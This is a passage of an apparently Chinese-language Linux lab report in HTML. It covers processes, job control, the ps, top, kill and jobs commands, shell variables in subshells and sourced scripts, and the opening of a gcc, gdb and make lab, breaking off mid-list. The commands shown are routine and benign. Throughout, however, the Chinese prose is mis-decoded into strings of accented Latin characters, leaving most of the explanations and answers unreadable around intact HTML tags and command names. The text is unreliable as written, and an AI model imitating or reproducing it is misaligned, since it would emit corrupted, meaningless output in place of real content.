3ã€è¿›ç¨‹</h4><p>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸­å¯ä»¥ç‹¬ç«‹è°ƒåº¦çš„å•å…ƒï¼Œæ¯ä¸ªæ‰§è¡Œçš„ä»»åŠ¡éƒ½æˆä¸ºè¿›ç¨‹ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œ</p><p>ç¨‹åºå’Œè¿›ç¨‹çš„æ¦‚å¿µå·®åˆ«åœ¨äºï¼šç¨‹åºæ˜¯ä¸€äº›æ•°æ®å’ŒæŒ‡ä»¤çš„é›†åˆï¼Œå®ƒé€šå¸¸æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨ï¼Œå¹¶ä¸”ä¸€æ—¦ç¨‹åºç”Ÿæˆåï¼Œé™¤éåˆ é™¤å®ƒï¼Œå¦åˆ™å®ƒå°†ä¸€ç›´å­˜åœ¨ã€‚è€Œè¿›ç¨‹æ˜¯ä¸€ä¸ªåŠ¨æ€çš„æ¦‚å¿µï¼Œå®ƒæ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œã€‚ä»ç³»ç»Ÿçš„è§’åº¦æ¥è¯´ï¼Œè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿç”¨äºè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œè¿›ç¨‹æ˜¯å¯ä»¥ç‹¬ç«‹æ‹¥æœ‰ç³»ç»Ÿèµ„æºçš„å•ä½ã€‚å®ƒå…·æœ‰å‡ ä¸ªç‰¹æ€§ï¼šå¹¶è¡Œæ€§ã€å¼‚æ­¥æ€§ã€äº’æ–¥æ€§ã€‚</p><h4 id="4-ä½œä¸š"><a class="markdownIt-Anchor" href="#4-ä½œä¸š"></a> 4ã€ä½œä¸š</h4><p>ä½œä¸šï¼ˆjobï¼‰è¿™ä¸ªæ¦‚å¿µæœ€æ—©å‡ºç°åœ¨æ‰¹å¤„ç†ç³»ç»Ÿä¸­ã€‚ä½œä¸šæ˜¯ç”¨æˆ·å‘è®¡ç®—æœºç³»ç»Ÿæäº¤ä¸€é¡¹å·¥ä½œçš„åŸºæœ¬å•ä½ï¼Œæ˜¯ç”¨æˆ·åœ¨ä¸€æ¬¡äº‹åŠ¡å¤„ç†æˆ–è®¡ç®—è¿‡ç¨‹ä¸­è¦æ±‚è®¡ç®—æœºæ‰€åšå·¥ä½œçš„æ€»å’Œã€‚</p><h4 id="5-è¿›ç¨‹å’Œä½œä¸š"><a class="markdownIt-Anchor" href="#5-è¿›ç¨‹å’Œä½œä¸š"></a> 5ã€è¿›ç¨‹å’Œä½œä¸š</h4><p>ä½œä¸šæ˜¯ç”¨æˆ·å‘è®¡ç®—æœºç³»ç»Ÿæäº¤ä¸€é¡¹å·¥ä½œçš„åŸºæœ¬å•ä½ï¼Œæ˜¯ç”¨æˆ·åœ¨ä¸€æ¬¡äº‹åŠ¡å¤„ç†æˆ–è®¡ç®—è¿‡ç¨‹ä¸­è¦æ±‚è®¡ç®—æœºæ‰€åšå·¥ä½œçš„æ€»å’Œï¼Œæ˜¯æè¿°ç”¨æˆ·å‘ç³»ç»Ÿæäº¤å·¥ä½œä»»åŠ¡çš„å®ä½“å•ä½ ã€‚è¿›ç¨‹æ˜¯ä¸€ä¸ªå…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºå…³äºæŸä¸ªæ•°æ®é›†åˆçš„ä¸€æ¬¡è¿è¡Œæ´»åŠ¨ï¼Œæ˜¯æ“ä½œç³»ç»Ÿåˆ†é…èµ„æºå’Œè¿›è¡Œè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯ç³»ç»Ÿå®Œæˆå·¥ä½œä»»åŠ¡æ—¶ç¨‹åºæ‰§è¡Œçš„å®ä½“å•ä½ã€‚</p><h4 id="6-å‰å°å’Œåå°"><a class="markdownIt-Anchor" href="#6-å‰å°å’Œåå°"></a> 6ã€å‰å°å’Œåå°</h4><p>å‰å°è¿›ç¨‹æ˜¯æŒ‡æ­£åœ¨å¯¹å®ƒè¿›è¡Œäº¤äº’æ“ä½œçš„è¿›ç¨‹â€”â€”å®ƒä»é”®ç›˜æ¥æ”¶è¾“å…¥ï¼Œå¹¶å°†è¾“å‡ºé€å¾€å±å¹•ï¼ˆå½“ç„¶ï¼Œç”¨æˆ·å¯ä»¥å¯¹è¾“å…¥è¾“å‡ºè¿›è¡Œé‡æ–°å®šå‘ï¼‰ã€‚æœ‰ä¸€äº›è¿›ç¨‹éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½ç»“æŸï¼Œå¹¶ä¸”è¿è¡Œèµ·æ¥å¾ˆå•è°ƒä¹å‘³ã€‚ç¼–è¯‘ç¨‹åºå°±æ˜¯ä¸€ä¸ªè¿™æ ·çš„è¿›ç¨‹ã€‚åœ¨åå°è¿è¡Œå®ƒä»¬å°±å¯ä»¥äº†ã€‚</p><h4 id="7-è¿›ç¨‹çŠ¶æ€åŠè½¬æ¢"><a class="markdownIt-Anchor" href="#7-è¿›ç¨‹çŠ¶æ€åŠè½¬æ¢"></a> 7ã€è¿›ç¨‹çŠ¶æ€åŠè½¬æ¢</h4><h5 id="1-è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€"><a class="markdownIt-Anchor" href="#1-è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€"></a> â‘´ è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€</h5><p><img src="/posts/da9b6b33/image-20211030112916303.png" alt="image-20211030112916303"></p><h5 id="2-linuxç³»ç»Ÿè¿›ç¨‹çŠ¶æ€"><a class="markdownIt-Anchor" href="#2-linuxç³»ç»Ÿè¿›ç¨‹çŠ¶æ€"></a> â‘µ linuxç³»ç»Ÿè¿›ç¨‹çŠ¶æ€</h5><p><img src="/posts/da9b6b33/image-20211030112940312.png" alt="image-20211030112940312"></p><h4 id="8-çˆ¶å­è¿›ç¨‹"><a class="markdownIt-Anchor" href="#8-çˆ¶å­è¿›ç¨‹"></a> 8ã€çˆ¶å­è¿›ç¨‹</h4><p>è¿›ç¨‹åœ¨å…¶æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œèƒ½é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¤šä¸ªæ–°è¿›ç¨‹ã€‚åˆ›å»ºè¿›ç¨‹æˆä¸ºçˆ¶è¿›ç¨‹ï¼Œè€Œæ–°è¿›ç¨‹ç§°ä¸ºè¯¥è¿›ç¨‹çš„å­è¿›ç¨‹ã€‚</p><h4 id="9-å‘½ä»¤ç®€ä»‹"><a class="markdownIt-Anchor" href="#9-å‘½ä»¤ç®€ä»‹"></a> 9ã€å‘½ä»¤ç®€ä»‹</h4><h5 id="1-psprocess-status"><a class="markdownIt-Anchor" href="#1-psprocess-status"></a> â‘´ Psï¼ˆProcess Statusï¼‰</h5><p>æŸ¥çœ‹ç›®å‰çš„ç³»ç»Ÿä¸­æœ‰å“ªäº›è¿›ç¨‹æ­£åœ¨æ‰§è¡Œï¼Œä»¥åŠå®ƒä»¬çš„æ‰§è¡Œæƒ…å†µã€‚<br>è¯­æ³•ï¼šps [ä»»é€‰å‚æ•°]<br>å¸¸ç”¨å‚æ•°:<br>psæˆ–ps -x æŸ¥çœ‹ç³»ç»Ÿä¸­ï¼Œå±äºè‡ªå·±çš„è¿›ç¨‹ã€‚<br>ps -au æŸ¥çœ‹ç³»ç»Ÿä¸­ï¼Œæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ã€‚<br>ps -aux æŸ¥çœ‹ç³»ç»Ÿä¸­ï¼ŒåŒ…å«ç³»ç»Ÿå†…éƒ¨çš„åŠæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ã€‚</p><h5 id="2-top"><a class="markdownIt-Anchor" href="#2-top"></a> â‘µ top</h5><p>åŠ¨æ€æ˜¾ç¤ºè¿›ç¨‹ï¼Œå®æ—¶ç›‘æµ‹è¿›ç¨‹çŠ¶æ€ã€‚<br>å¸¸ç”¨æ“ä½œï¼š<br>qï¼šé€€å‡ºtopå‘½ä»¤ã€‚<br>mï¼šåˆ‡æ¢æ˜¾ç¤ºå†…å­˜ä¿¡æ¯ã€‚<br>tï¼šåˆ‡æ¢æ˜¾ç¤ºè¿›ç¨‹å’ŒCPUçŠ¶æ€ä¿¡æ¯ã€‚<br>cï¼šåˆ‡æ¢æ˜¾ç¤ºå‘½ä»¤åç§°å’Œå®Œæ•´å‘½ä»¤è¡Œã€‚<br>Wï¼šå°†å½“å‰è®¾ç½®å†™å…¥~/.toprcæ–‡ä»¶ä¸­ã€‚è¿™æ˜¯å†™topé…ç½®æ–‡ä»¶çš„æ¨èæ–¹æ³•ã€‚</p><h5 id="3-kill"><a class="markdownIt-Anchor" href="#3-kill"></a> â‘¶ kill</h5><p>Killå‘½ä»¤å¯ä»¥ä¼ é€çš„ä¿¡å·æœ‰å¾ˆå¤šç§ï¼Œä½†ä»¥SIGTERMï¼ˆ15ï¼‰æˆ–SIGKILLï¼ˆ9ï¼‰å±…å¤šï¼Œå®ƒä»¬éƒ½æ˜¯ç”¨æ¥ç»“æŸè¿›ç¨‹æ‰§è¡Œçš„ã€‚<br>è¯­æ³•ï¼škill [-9] PID<br>PIDï¼šåˆ©ç”¨ps å‘½ä»¤æ‰€æŸ¥å‡ºçš„è¿›ç¨‹å·ã€‚<br>ä¾‹å¦‚:<br>kill 456æˆ–kill -9 456 ç»ˆæ­¢è¿›ç¨‹å·ä¸º456 çš„è¿›ç¨‹ã€‚<br>è¯­æ³•ï¼škill %n<br>nï¼šåˆ©ç”¨jobså‘½ä»¤æŸ¥çœ‹å‡ºçš„åå°ä½œä¸šå·<br>ç»“æŸæˆ–ç»ˆæ­¢åå°ä¸­çš„è¿›ç¨‹</p><h5 id="4"><a class="markdownIt-Anchor" href="#4"></a> â‘· &amp;</h5><p>åœ¨åå°æ‰§è¡Œè¿›ç¨‹çš„æ–¹å¼<br>è¯­æ³•ï¼šå‘½ä»¤&amp;</p><h5 id="5-jobs"><a class="markdownIt-Anchor" href="#5-jobs"></a> â‘¸ jobs</h5><p>æ˜¾ç¤ºå½“å‰ä¼šè¯çš„ä½œä¸šçŠ¶æ€ã€‚<br>è¯­æ³•<br>jobs [ -l | -n | -p ] [ JobID â€¦ ]</p><h5 id="6-å¤–å£³å˜é‡"><a class="markdownIt-Anchor" href="#6-å¤–å£³å˜é‡"></a> â‘¹ å¤–å£³å˜é‡</h5><p>æŸ¥çœ‹å¤–å£³å˜é‡çš„è®¾å®šå€¼<br>è¯­æ³•ï¼šset æŸ¥çœ‹æ‰€æœ‰å¤–å£³å˜é‡çš„è®¾å®šå€¼ã€‚<br>è¯­æ³•ï¼šecho $å˜é‡åæ˜¾ç¤ºæŒ‡å®šçš„å¤–å£³å˜é‡çš„è®¾å®šå€¼ã€‚</p><p>è®¾å®šå¤–å£³å˜é‡<br>è¯­æ³•ï¼šset var = value<br>åˆ é™¤å¤–å£³å˜é‡<br>è¯­æ³•ï¼šunset var</p><h5 id="7-æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç”¨æˆ·"><a class="markdownIt-Anchor" href="#7-æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç”¨æˆ·"></a> â‘º æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç”¨æˆ·</h5><p>Whoå‘½ä»¤ä¸»è¦ç”¨äºæŸ¥çœ‹å½“å‰ç™»å½•çš„ç”¨æˆ·æƒ…å†µã€‚<br>è¯­æ³•ï¼š who [-imqsuwHT][- -count][- -heading][- -help][- -<br>message][- -mesg][- -version][- -writable][file][am i]<br>â‘»æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸Šæ‰€æœ‰å·¥ä½œç«™çš„ç”¨æˆ·<br>è¯­æ³•: rusers<br>æŒ‰Ctrl+D&gt; ç»“æŸ</p><h3 id="å››-å®éªŒå†…å®¹-2"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹-2"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-è¿›ç¨‹çš„ç»“æ„"><a class="markdownIt-Anchor" href="#1-è¿›ç¨‹çš„ç»“æ„"></a> 1. è¿›ç¨‹çš„ç»“æ„</h4><p><strong>(1) ç™»å½•è¿›ç¨‹ç³»ç»Ÿï¼Œæ˜¾ç¤ºå½“å‰çš„è¿›ç¨‹ID</strong></p><p><img src="/posts/da9b6b33/image-20211030125913051.png" alt="image-20211030125913051"></p><p><strong>(2) åˆ›å»ºä¸€ä¸ªå­shell</strong></p><p><img src="/posts/da9b6b33/image-20211030130010739.png" alt="image-20211030130010739"></p><p><strong>(3) æ‰§è¡Œ<code>ls -R / &gt; outfile2 2&gt;&gt; errfile &amp;</code>å‘½ä»¤åï¼Œç«‹å³å†è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œåˆ—å‡ºä½ çš„æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚</strong></p><p><img src="/posts/da9b6b33/image-20211030130949729.png" alt="image-20211030130949729"></p><p><strong>(4) ä½¿ç”¨exitå‘½ä»¤ï¼Œä¸­æ­¢ä½ çš„å­shellè¿›ç¨‹ã€‚å¦‚æœå†æ¬¡ä½¿ç”¨exitå‘½ä»¤ï¼Œé€€å‡ºä½ çš„ç™»å½•shellï¼Œæ­¤æ—¶ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</strong></p><p>ä¸€æ¬¡exitåå›åˆ°ç”¨æˆ·ï¼Œè¿ç»­ç”¨ä¸¤æ¬¡exitåç»ˆç«¯å…³é—­ã€‚</p><p><strong>(5) æ˜¾ç¤ºå‡ºå½“å‰è¿›ç¨‹ç¯å¢ƒä¸­çš„æ‰€æœ‰å˜é‡</strong></p><p><img src="/posts/da9b6b33/image-20211030131133059.png" alt="image-20211030131133059"></p><p><strong>(6) åˆ›å»ºä¸€ä¸ªå˜é‡xï¼Œå¹¶å°†å®ƒçš„å€¼èµ‹ä¸º10,æŸ¥çœ‹å˜é‡xçš„å€¼,å†æ¬¡åˆ—å‡ºä½ çš„å½“å‰è¿›ç¨‹ç¯å¢ƒä¸­çš„æ‰€æœ‰å˜é‡</strong></p><p><img src="/posts/da9b6b33/image-20211030131337702.png" alt="image-20211030131337702"></p><p>æˆ‘ä»¬å‘ç°x=10å‡ºç°åœ¨äº†ç¯å¢ƒå˜é‡ä¸­</p><p><img src="/posts/da9b6b33/image-20211030131444720.png" alt="image-20211030131444720"></p><p><strong>(7) åˆ›å»ºä¸€ä¸ªå­shellã€‚æŸ¥çœ‹å­shellä¸­å˜é‡xçš„å€¼ã€‚å®ƒçš„å€¼æ˜¯å¤šå°‘ï¼Ÿåˆ—å‡ºå­shellä¸­æ‰€æœ‰çš„å½“å‰å˜é‡ï¼Œæœ‰å˜é‡xå—ï¼Ÿ</strong></p><p>å­shellä¸­å˜é‡xå€¼ä¸ºç©ºï¼Œå­shellä¸­æ²¡æœ‰å˜é‡x</p><p><img src="/posts/da9b6b33/image-20211030132032214.png" alt="image-20211030132032214"></p><p><strong>(8) è¿”å›åˆ°çˆ¶è¿›ç¨‹ã€‚å°†å˜é‡xçš„å€¼ä¼ é€’ç»™å­è¿›ç¨‹ã€‚åˆ›å»ºä¸€ä¸ªå­shellï¼Œå¹¶ä¸”æŸ¥çœ‹å˜é‡xçš„å€¼ã€‚</strong></p><p>å­shellä¸­å˜é‡xå˜æˆäº†10</p><p><img src="/posts/da9b6b33/image-20211030132658588.png" alt="image-20211030132658588"></p><p><strong>(9) åœ¨å­shellä¸­å°†200èµ‹ç»™å˜é‡xã€‚æŸ¥çœ‹å˜é‡çš„å€¼æ˜¯å¦å·²ç»æ”¹å˜äº†</strong></p><p>å˜æˆäº†200</p><p><img src="/posts/da9b6b33/image-20211030132753073.png" alt="image-20211030132753073"></p><p><strong>(10) å›åˆ°çˆ¶è¿›ç¨‹ä¸­ã€‚æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸­ï¼Œå˜é‡xçš„å€¼ã€‚å­shellä¸­å¯¹å˜é‡xçš„å€¼çš„æ”¹å˜ï¼Œä¸Šä¼ åˆ°äº†çˆ¶shellä¸­å—</strong></p><p>çˆ¶è¿›ç¨‹ä»ç„¶ä¸º10ï¼Œ å­shellå¯¹å˜é‡xçš„æ”¹å˜æ²¡æœ‰ä¸Šä¼ åˆ°çˆ¶shellã€‚</p><p><img src="/posts/da9b6b33/image-20211030132838620.png" alt="image-20211030132838620"></p><p><strong>(11) åˆ›å»ºä¸€ä¸ªshellè„šæœ¬ï¼Œå°†å…¶å‘½åä¸ºsc1ï¼Œå®ƒçš„å†…å®¹åº”æ˜¯ï¼špwd ; cd / ; pwd</strong></p><p><img src="/posts/da9b6b33/image-20211030133043339.png" alt="image-20211030133043339"></p><p><strong>(12) å°†æ–‡ä»¶sc1è®¾ç½®æˆå¯æ‰§è¡Œï¼Œè€Œåè¿è¡Œè¯¥æ–‡ä»¶ã€‚ä½ ç°åœ¨å¤„äºå“ªä¸ªç›®å½•ä¸­å‘¢ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</strong></p><p><img src="/posts/da9b6b33/image-20211030133355098.png" alt="image-20211030133355098"></p><p>ä¾æ—§åœ¨å½“å‰ç›®å½•</p><p>å› ä¸ºç”¨./æ–¹å¼è¿è¡Œè„šæœ¬ï¼Œå°±ç›¸å½“äºå¯åŠ¨äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨ å­è¿›ç¨‹é‡Œè¿›å…¥äº†æ ¹ç›®å½•ï¼Œä½†æ˜¯å½“å‰è¿›ç¨‹ä»åœ¨å½“å‰ç›®å½•ï¼Œè„šæœ¬æ‰§è¡Œå®Œçš„æ—¶å€™å­è¿›ç¨‹ç»“æŸäº† ï¼Œä¼šå›åˆ°å½“å‰è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯å›åˆ°äº†å½“å‰ç›®å½•ã€‚</p><p><strong>(13) åˆ›å»ºå¦ä¸€ä¸ªåä¸ºsc2çš„shellè„šæœ¬ã€‚å®ƒçš„å†…å®¹æ˜¯ï¼švar1=hello;var2=$LOGNAME;export var1 var2</strong></p><p><img src="/posts/da9b6b33/image-20211030133517973.png" alt="image-20211030133517973"></p><p><strong>(14) å°†æ–‡ä»¶sc2è®¾ç½®æˆå¯æ‰§è¡Œï¼Œè€Œåè¿è¡Œè¯¥æ–‡ä»¶ã€‚è¿è¡Œç»“æŸåï¼ŒæŸ¥çœ‹å˜é‡var1ä¸var2çš„å€¼ã€‚var1ä¸var2çš„å€¼åˆ†åˆ«ä¸ºå¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</strong></p><p>å€¼ä¸ºç©º</p><p>å› ä¸ºç”¨./æ–¹å¼è¿è¡Œè„šæœ¬ï¼Œå°±ç›¸å½“äºå¯åŠ¨äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨è„šæœ¬é‡Œè®¾ç½®çš„ç¯å¢ƒå˜é‡åªåœ¨è¿™ä¸ªå­è¿›ç¨‹é‡Œæœ‰æ•ˆï¼Œè„šæœ¬æ‰§è¡Œå®Œçš„æ—¶å€™å­è¿›ç¨‹ç»“æŸäº† è„šæœ¬é‡Œçš„ç¯å¢ƒå˜é‡ä»¥åŠåˆ«çš„å˜é‡éƒ½ä¼šæ¶ˆå¤±ã€‚</p><p><img src="/posts/da9b6b33/image-20211030133653527.png" alt="image-20211030133653527"></p><p><strong>(15) å†æ¬¡è¿è¡Œæ–‡ä»¶sc2ã€‚ æ­¤æ¬¡ï¼Œä½¿ç”¨â€™.â€™å‘½ä»¤ï¼Œå¼ºè¿«è¯¥æ–‡ä»¶åœ¨å½“å‰shellä¸­è¿è¡Œã€‚è¿è¡Œç»“æŸåï¼ŒæŸ¥çœ‹å˜é‡var1ä¸var2çš„å€¼ã€‚ç°åœ¨var1ä¸var2çš„å€¼åˆ†åˆ«ä¸ºå¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</strong></p><p>. sc2ä¼šå¼ºåˆ¶è¯¥æ–‡ä»¶åœ¨å½“å‰shellæ‰§è¡Œï¼Œæ‰€ä»¥è®¾ç½®çš„å˜é‡ä»åœ¨å½“å‰shellè¿›ç¨‹ã€‚</p><p><img src="/posts/da9b6b33/image-20211030133737229.png" alt="image-20211030133737229"></p><h4 id="2-ä½œä¸šæ§åˆ¶"><a class="markdownIt-Anchor" href="#2-ä½œä¸šæ§åˆ¶"></a> 2. ä½œä¸šæ§åˆ¶</h4><p><strong>(1) åœ¨å‰å°æ‰§è¡Œå‘½ä»¤ls â€“R / &gt; outfile 2&gt; errfile</strong></p><p><img src="/posts/da9b6b33/image-20211030135325815.png" alt="image-20211030135325815"></p><p><strong>(2) æš‚åœè¿™ä¸ªä½ åˆšåˆšå¯åŠ¨çš„ä½œä¸š</strong></p><p><img src="/posts/da9b6b33/image-20211030135339362.png" alt="image-20211030135339362"></p><p><strong>(3) å°†ä¸Šé¢æš‚åœçš„ä½œä¸šè½¬è‡³åå°ç»§ç»­è¿è¡Œ</strong></p><p><img src="/posts/da9b6b33/image-20211030135402168.png" alt="image-20211030135402168"></p><p><strong>(4) æŠŠè¿™ä¸ªä½œä¸šè½¬åˆ°å‰å°æ¥</strong></p><p><img src="/posts/da9b6b33/image-20211030135432502.png" alt="image-20211030135432502"></p><p><strong>(5) å½“lså‘½ä»¤æ‰§è¡Œç»“æŸæ—¶ï¼Œåœ¨åå°é‡æ–°å¯åŠ¨å®ƒã€‚æ˜¾ç¤ºå‡ºè¿›ç¨‹çš„IDï¼Œè€Œåé€€å‡ºç³»ç»Ÿ</strong></p><p><img src="/posts/da9b6b33/image-20211030140208832.png" alt="image-20211030140208832"></p><p><strong>(6) é‡æ–°ç™»å½•è¿›æ¥ï¼ŒæŸ¥çœ‹è¯¥åå°è¿›ç¨‹æ˜¯å¦ä»åœ¨è¿è¡Œ</strong></p><p>æ²¡æœ‰åœ¨ç»§ç»­æ‰§è¡Œ</p><p><img src="/posts/da9b6b33/image-20211030140339679.png" alt="image-20211030140339679"></p><p><strong>(7) åˆ›å»ºä¸€ä¸ªåŒ…å«å¦‚ä¸‹å†…å®¹çš„shellè„šæœ¬æ–‡ä»¶sc3</strong></p><p><img src="/posts/da9b6b33/image-20211030142215744.png" alt="image-20211030142215744"></p><p><strong>å°†å®ƒç½®ä¸ºå¯æ‰§è¡Œã€‚ä½¿ç”¨nohupå‘½ä»¤è¿è¡Œè¯¥æ–‡ä»¶ï¼Œå¹¶å°†å…¶æ”¾åœ¨åå°è¿è¡Œï¼ˆå°†è¾“å‡ºé‡å®šå‘åˆ°sc3.outï¼Œå°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°sc3errï¼‰ã€‚ç„¶åé€€å‡ºç³»ç»Ÿã€‚</strong></p><p>ç”¨psæ‰“å°å½“å‰æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ï¼Œè®°ä¸‹è¿›ç¨‹å·ï¼Œç„¶åå…³é—­</p><p><img src="/posts/da9b6b33/image-20211030143202728.png" alt="image-20211030143202728"></p><p><strong>(8) å†æ¬¡ç™»å½•è¿›æ¥ï¼Œç”¨topæŸ¥çœ‹è¿›ç¨‹æ˜¯å¦ä»åœ¨è¿è¡Œ</strong></p><p>ç”¨top -p 12062æŸ¥çœ‹æŒ‡å®šçš„sleepè¿›ç¨‹å‘ç°è¿›ç¨‹ä»åœ¨è¿è¡Œ</p><p><img src="/posts/da9b6b33/image-20211030143224175.png" alt="image-20211030143224175"></p><p><strong>(9) è¿›ç¨‹å®Œæˆåï¼Œæ˜¾ç¤ºè¾“å‡ºæ–‡ä»¶outfileçš„å†…å®¹</strong></p><p><img src="/posts/da9b6b33/image-20211030142118969.png" alt="image-20211030142118969"></p><p>æ–‡ä»¶è¿‡å¤§ï¼Œæ— æ³•å®Œå…¨æ˜¾ç¤º</p><p><img src="/posts/da9b6b33/image-20211030142054634.png" alt="image-20211030142054634"></p><h4 id="3-ç»“æŸä¸€ä¸ªè¿›ç¨‹"><a class="markdownIt-Anchor" href="#3-ç»“æŸä¸€ä¸ªè¿›ç¨‹"></a> 3. ç»“æŸä¸€ä¸ªè¿›ç¨‹</h4><p><strong>(1) ä½¿ç”¨ls â€“R / å‘½ä»¤ï¼ˆå°†é”™è¯¯é‡å®šå‘ï¼Œå°†è¾“å‡ºé‡å®šå‘ï¼‰ï¼Œåœ¨åå°å¯åŠ¨è¿™ä¸ªè¿è¡Œæ—¶é—´å¾ˆé•¿çš„ä½œä¸šã€‚è¯·è®°å½•è¯¥åå°è¿›ç¨‹çš„IDå·</strong></p><p><img src="/posts/da9b6b33/image-20211030144817392.png" alt="image-20211030144817392"></p><p><strong>(2) åœ¨çŸ¥é“è¿›ç¨‹IDçš„æƒ…å†µä¸‹ï¼Œæ€æ­»è¿™ä¸ªè¿›ç¨‹ã€‚ç¡®è®¤ä½ å·²ç»æ€æ­»äº†è¯¥è¿›ç¨‹</strong><br><img src="/posts/da9b6b33/image-20211030144834597.png" alt="image-20211030144834597"></p><h4 id="4-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"><a class="markdownIt-Anchor" href="#4-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"></a> 4. æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h4><p><strong>(1) æŸ¥çœ‹ç›®å‰åœ¨ç³»ç»Ÿä¸­ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·æ¸…å•</strong><br><img src="/posts/da9b6b33/image-20211030145609431.png" alt="image-20211030145609431"><br><strong>(2) æ˜¾ç¤ºç™»é™†è€…ä¿¡æ¯</strong><br><img src="/posts/da9b6b33/image-20211030145623590.png" alt="image-20211030145623590"></p><h2 id="å®éªŒ6-cç¼–ç¨‹å’Œè°ƒè¯•"><a class="markdownIt-Anchor" href="#å®éªŒ6-cç¼–ç¨‹å’Œè°ƒè¯•"></a> å®éªŒ6 Cç¼–ç¨‹å’Œè°ƒè¯•</h2><h3 id="ä¸€-å®éªŒç›®çš„-3"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„-3"></a> ä¸€ã€å®éªŒç›®çš„</h3><ul><li>ä½¿ç”¨æˆ·ç†Ÿæ‚‰Cç¼–ç¨‹å·¥å…·gccã€gdbã€make</li><li>ç†Ÿç»ƒæŒæ¡gccã€gdbã€make ï¼Œä¸ºåç»­é¡¹ç›®ä½œå‡†å¤‡</li></ul><h3 id="äºŒ-å®éªŒè¦æ±‚-3"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚-3"></a> äºŒã€å®éªŒè¦æ±‚</h3><ul><li>ç†Ÿæ‚‰gccç¼–è¯‘å››é˜¶æ®µï¼Œä¹ æƒ¯gccç•Œé¢ä¸æŸ¥é”™ï¼Œç”¨gccç¼–è¯‘ä¸€ä¸ªç¤ºä¾‹ç¨‹åºã€‚</li><li>ç†Ÿæ‚‰gdbå¸¸è§è°ƒè¯•å‘½ä»¤ï¼Œç”¨gdbè°ƒè¯•ä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼Œç†Ÿæ‚‰è°ƒè¯•ç¯å¢ƒã€‚</li><li>ç†Ÿæ‚‰makeå’Œmakefileè§„åˆ™ï¼Œé€šè¿‡æŸ¥çœ‹ä¸€ä¸ªç¤ºä¾‹ç¨‹åºmakefileï¼Œå­¦ä¼šç”¨makefileç®¡ç†è‡ªå·±çš„é¡¹ç›®ã€‚</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-3"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-3"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><h4 id="1-gcc"><a class="markdownIt-Anchor" href="#1-gcc"></a> 1. Gcc</h4><p>GNU Cç¼–è¯‘å™¨ï¼ˆGCCï¼‰æ˜¯ä¸€ä¸ªåœ¨Unixæˆ–linuxç­‰ç³»ç»Ÿä¸Šè¿è¡Œçš„åŠŸèƒ½å¼ºå¤§çš„ç¼–è¯‘å™¨ï¼Œä¸»è¦ç”¨äºå¯¹C/C++/Object Cç­‰è¯­è¨€çš„ç¼–è¯‘ã€‚</p><h5 id="1-gccæä¾›çš„å„ç§ç¨‹åºä»¥åŠå„ä¸ªå¤´æ–‡ä»¶çš„ä½ç½®"><a class="markdownIt-Anchor" href="#1-gccæä¾›çš„å„ç§ç¨‹åºä»¥åŠå„ä¸ªå¤´æ–‡ä»¶çš„ä½ç½®"></a> (1) GCCæä¾›çš„å„ç§ç¨‹åºä»¥åŠå„ä¸ªå¤´æ–‡ä»¶çš„ä½ç½®</h5><ul><li>/usr/lib/gcc-lib/target/version/åŠå…¶å­ç›®å½• ï¼Œå¤§éƒ¨åˆ†çš„ç¼–è¯‘å™¨éƒ½è¢«æ”¾åœ¨è¿™ä¸ªåœ°æ–¹ ã€‚</li><li>/usr/bin/gcc è¿™é‡Œè£…çš„æ˜¯ç¼–è¯‘å™¨çš„é©±åŠ¨ç¨‹åºã€‚</li><li>/libä¸/usr/lib è¿™ä¸¤ä¸ªç›®å½•ä¸å¦å¤–çš„ä¸€äº›ç›®å½•éƒ½æ˜¯æœ¬åœ°ç³»ç»Ÿçš„ç¨‹åºåº“ç›®å½•ã€‚</li><li>/usr/include/åŠå…¶å­ç›®å½• 